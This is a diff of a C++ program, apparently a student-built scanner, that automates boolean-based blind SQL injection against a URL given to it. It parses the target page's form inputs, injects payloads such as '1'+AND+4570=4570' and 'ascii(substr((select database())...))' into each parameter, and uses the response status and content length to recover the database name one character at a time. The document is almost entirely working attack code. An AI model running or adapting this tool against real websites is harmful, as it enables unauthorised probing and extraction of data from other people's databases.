@@ -5,196 +5,57 @@
 #include <curl/curl.h>
 #include <sstream>
 #include <tuple>
+#include "functions.h"
 using namespace std;
-// Callback function to store response data
-size_t WriteCallback(char *ptr, size_t size, size_t nmemb, std::string *userdata)
+int extractContentlength(string url)
 {
-    size_t len = size * nmemb;
-    userdata->append(ptr, len);
-    return len;
-}
+    int length;
+    CURL* curl;
+    CURLcode res;
+    std::string response;
 
-std::vector<int> compute_prefix(const std::string& pattern)
-{
-    int n = pattern.size();
-    std::vector<int> prefix(n);
-    prefix[0] = 0;
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
 
-    int j = 0;
-    for (int i = 1; i < n; i++)
+    if(curl)
     {
-        while (j > 0 && pattern[j] != pattern[i])
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+        res = curl_easy_perform(curl);
+
+        if(res == CURLE_OK)
         {
-            j = prefix[j-1];
+            double contentLength;
+            res = curl_easy_getinfo(curl, CURLINFO_CONTENT_LENGTH_DOWNLOAD, &contentLength);
+            if(res == CURLE_OK)
+            {
+                //std::cout << "Content Length: " << contentLength << std::endl;
+                length=(int)contentLength;
+            }
         }
-        if (pattern[j] == pattern[i])
+        else
         {
-            j++;
+            std::cout << "Error: " << curl_easy_strerror(res) << std::endl;
         }
-        prefix[i] = j;
-    }
 
-    return prefix;
-}
-
-
-// Search for the pattern within the text using the KMP algorithm
-size_t Find(const std::string& text, const std::string& pattern)
-{
-    int n = text.size();
-    int m = pattern.size();
-
-    // Compute the prefix function for the pattern
-    std::vector<int> prefix = compute_prefix(pattern);
-
-    int j = 0;
-    for (int i = 0; i < n; i++)
-    {
-        while (j > 0 && pattern[j] != text[i])
-        {
-            j = prefix[j-1];
-        }
-        if (pattern[j] == text[i])
-        {
-            j++;
-        }
-        if (j == m)
-        {
-            // Found a match at position i-m+1
-            return i-m+1;
-        }
-    }
-
-    // Pattern not found
-    return std::string::npos;
-}
-
-std::string get_attribute_value(const std::string& tag, const std::string& attr_name)
-{
-    // Find the position of the attribute name in the tag
-    size_t attr_pos = tag.find(attr_name);
-    if (attr_pos == std::string::npos)
-    {
-        // Attribute not found
-        return "";
-    }
-
-    // Find the value of the attribute
-    size_t value_pos = tag.find("=", attr_pos);
-    if (value_pos == std::string::npos)
-    {
-        // Attribute value not found
-        return "";
-    }
-
-    // Skip the "=" character and any whitespace
-    value_pos = tag.find_first_not_of(" \t", value_pos + 1);
-    if (value_pos == std::string::npos)
-    {
-        // Attribute value not found
-        return "";
-    }
-
-    // Find the end of the attribute value
-    size_t value_end_pos = value_pos;
-    if (tag[value_pos] == '\"' || tag[value_pos] == '\'')
-    {
-        // Attribute value is enclosed in quotes
-        char quote_char = tag[value_pos];
-        value_end_pos = tag.find(quote_char, value_pos + 1);
-        if (value_end_pos == std::string::npos)
-        {
-            // Attribute value not properly terminated
-            return "";
-        }
-    }
-    else
-    {
-        // Attribute value is not enclosed in quotes
-        value_end_pos = tag.find_first_of(" \t", value_pos);
-        if (value_end_pos == std::string::npos)
-        {
-            // Attribute value extends to the end of the tag
-            value_end_pos = tag.size();
-        }
-    }
-
-    // Extract the attribute value and return it
-    return tag.substr(value_pos+1, value_end_pos - value_pos-1);
-}
-
-// Extract parameters from an HTML file
-std::vector<std::tuple<std::string, std::string, std::string>> extract_parameters(const std::string html)
-{
-    // Open the HTML file
-
-
-    // Read the contents of the file into a string
-
-    // Find all input tags in the HTML string
-    std::vector<std::tuple<std::string, std::string, std::string>> params;
-    size_t pos = 0;
-    while ((pos = html.find("<input", pos)) != std::string::npos)
-    {
-        // Extract the tag and find the value of the "name", "type", and "value" attributes
-        std::string tag = html.substr(pos, html.find(">", pos) - pos + 1);
-        std::string name = get_attribute_value(tag, "name");
-        std::string type = get_attribute_value(tag, "type");
-        std::string value = get_attribute_value(tag, "value");
-        if (!name.empty())
-        {
-            params.emplace_back(name, type, value);
-        }
-        pos += tag.size();
-    }
-
-    // Return the parameter names, types, and values
-    return params;
-}
-string sendHttpRequest(string url)
-{
-    string response;
-    CURL *curl = curl_easy_init();
-    if (!curl)
-    {
-        std::cerr << "Failed to initialize curl\n";
-        return "";
-    }
-    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
-
-    curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
-    curl_easy_setopt(curl, CURLOPT_HEADER, 1);
-
-    CURLcode res = curl_easy_perform(curl);
-    if (res != CURLE_OK)
-    {
-        std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
         curl_easy_cleanup(curl);
-        return "";
     }
 
-    if (response.empty())
-    {
-        std::cerr << "Empty response data\n";
-    }
-    curl_easy_cleanup(curl);
-    return response;
+    curl_global_cleanup();
 
-
+    return length;
 }
 
 
 int find_dbname_length(string url,vector<std::tuple<std::string, std::string, std::string>> params)
 {
 
-    int length;
+    int length=0;
     std::string response;
-    std::string successmessage="exists";
+    std::string successmessage="200 OK";
     std::string payload="1'AND+length(database())+=";
-    std::string fixedpayload="%23&Submit=Submit";
 
     url+="/?";
 
@@ -228,11 +89,12 @@ int find_dbname_length(string url,vector<std::tuple<std::string, std::string, st
                 cnt++;
             }
         }
-        cout << url1 <<"\n";
+        // cout << url1 <<"\n";
         response=sendHttpRequest(url1);
-        //cout << response <<"\n";
-        if(Find(response,successmessage)!=std::string::npos)
+
+        if(Find(response,successmessage)!=std::string::npos&&extractContentlength(url)!=extractContentlength(url1))
         {
+
             length=i;
             break;
         }
@@ -243,9 +105,9 @@ int find_dbname_length(string url,vector<std::tuple<std::string, std::string, st
 
 std::string find_dbname(string url,vector<std::tuple<std::string, std::string, std::string>> params,int length)
 {
-    url+="?";
+    url+="/?";
     std::string name="";
-    std::string successmessage="exists";
+    std::string successmessage="200 OK";
     std::string payloadpart1="1'+AND+(ascii(substr((select+database()),";
     std::string payloadpart2=",1)))+=+";
     for(int i=1; i<=length; i++)
@@ -286,7 +148,7 @@ std::string find_dbname(string url,vector<std::tuple<std::string, std::string, s
             //cout << url1 <<"\n";
             response=sendHttpRequest(url1);
             //cout << response <<"\n";
-            if(Find(response,successmessage)!=std::string::npos)
+            if(Find(response,successmessage)!=std::string::npos&&extractContentlength(url)!=extractContentlength(url1))
             {
                 std::cout << i<<" character of dbname is : "<<(char)j<<"\n";
                 name.push_back((char)j);
@@ -300,22 +162,16 @@ std::string find_dbname(string url,vector<std::tuple<std::string, std::string, s
 }
 
 
-int main()
+void Booleanbased(string url)
 {
-
+    cout <<"Performing Boolean based SQLi....\n";
     std::string payload="1'+AND+4570=4570+AND+'ZeoB'='ZeoB";
 
 
     bool vulnerable=false;
 
     std::string response;
-
-    std::string url ;
-    std:: cout <<"Enter the url: \n";
-    std::string successmessage="exists";
-    std::string errormessage="MISSING";
-
-    std::cin >> url;
+    std::string successmessage="200 OK";
     response=sendHttpRequest(url);
 
 
@@ -325,7 +181,7 @@ int main()
 
     // Print the parameter names
     std::string url1=url;
-    url1+="?";
+    url1+="/?";
     int cnt=1;
     for (const auto& param : params)
     {
@@ -354,27 +210,38 @@ int main()
     string response2=sendHttpRequest(url1);
 
     // std::cout << "Response: " << response2 << "\n";
-    if(Find(response2,successmessage)!=std::string::npos)
+    if(Find(response2,successmessage)!=std::string::npos&&extractContentlength(url)!=extractContentlength(url1))
     {
         vulnerable=true;
     }
 
 
-
+    HANDLE col;
+    col= GetStdHandle(STD_OUTPUT_HANDLE);
 
     if(vulnerable)
     {
-        std::cout << "The website is vulnerable to Blind SQL injection\n";
+        SetConsoleTextAttribute(col,4);
+        std::cout << "The website is vulnerable to Boolean based Blind SQL injection\n\n";
+        SetConsoleTextAttribute(col,15);
     }
-    else std::cout << "The website is not vulnerable.Sorry we can not do any further work\n";
+    else
+    {
+        SetConsoleTextAttribute(col,2);
+        std::cout << "The website is not vulnerable to Boolean based Blind SQL injection.\n\n";
+        SetConsoleTextAttribute(col,15);
+    }
 
     if(vulnerable)
     {
         int len=find_dbname_length(url,params);
+        SetConsoleTextAttribute(col,3);
         std::cout << "Length of the database name is "<< len << "\n";
+        SetConsoleTextAttribute(col,15);
 
         std::string name=find_dbname(url,params,len);
+        SetConsoleTextAttribute(col,3);
         std::cout << "Database name is "<< name<< "\n";
-    }
-    return 0;
+        SetConsoleTextAttribute(col,15);
+    };
 }
